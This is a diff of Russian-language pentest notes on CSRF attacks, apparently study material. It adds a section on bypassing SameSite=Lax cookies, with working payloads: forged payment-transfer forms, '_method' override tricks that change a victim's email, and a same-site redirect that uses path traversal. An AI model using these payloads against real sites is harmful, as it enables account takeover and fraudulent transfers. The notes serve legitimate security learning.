@@ -67,7 +67,7 @@ email=wiener@normal-user.com
 ```
 <html> 
 	<body> 
-		<form action="https://vulnerable-website.com/email/change" method="GET"> 
+		<form action="https://<target>/email/change" method="GET"> 
 			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
 		</form> 
 		<script> 
@@ -81,3 +81,19 @@ email=wiener@normal-user.com
 	- Если токен не привязан к куки и сессии, атакующий может использовать свой токен: сделать новый запрос для генерации нового токена и перехватить запрос
 	- Если токен привязан к куки, которая не зависит от сессии, атакующий может использовать новый токен в запросе и привязанный куки, который необходимо установить в браузер жертве. Эксплуатация возможна, если куки, управляющая сессией, никак не связана с CSRF-токенами (параметр формы `csrf` и куки `csrfKey` связаны между собой, но не связаны с куки `session`). Атакующий должен внедрить свою куки и параметр в сессию жерты (например, с помощью [HTTP response header injection](https://portswigger.net/kb/issues/00200200_http-response-header-injection)
 	- Если сервер проверяет, что куки совпадает с параметром формы, но не проверяет на то, что данное значение было реально сформировано сервером. Атакующий может подставить туда либо свое значение, либо любое составленное им и проходящее проверки формата токенов
+## Способы обхода SameSite=Lax
+- Использование GET-запроса вместо POST-запроса с навигацией верхнего уровня: `<script> document.location = 'https://<target>/account/transfer-payment?recipient=hacker&amount=1000000'; </script>`; также возможно переопределение метода запроса в некоторых фреймворках ([список фреймворков и способов переопределений, которые они поддерживают](https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/)): 
+```
+<form action="https://<target>/account/transfer-payment" method="POST"> 
+  <input type="hidden" name="_method" value="GET"> 
+  <input type="hidden" name="recipient" value="hacker"> 
+  <input type="hidden" name="amount" value="1000000"> 
+</form>
+```
+```
+<script>
+  document.location = 'https://<target>/my-account/change-email?email=evil%40gmail.com&_method=POST';
+</script>
+```
+- Использование перенаправлений в рамках одного сайта (Same Site) - жертва заходит на сайт злоумышленника, который перенаправляет на страницу сайта, перенаправляющую на другую страницу сайта: `<script> document.location = 'https://<target>/post/comment/confirmation?postId=../my-account/change-email?email=evil%40gmail.com%26submit=1';</script>`
+- 
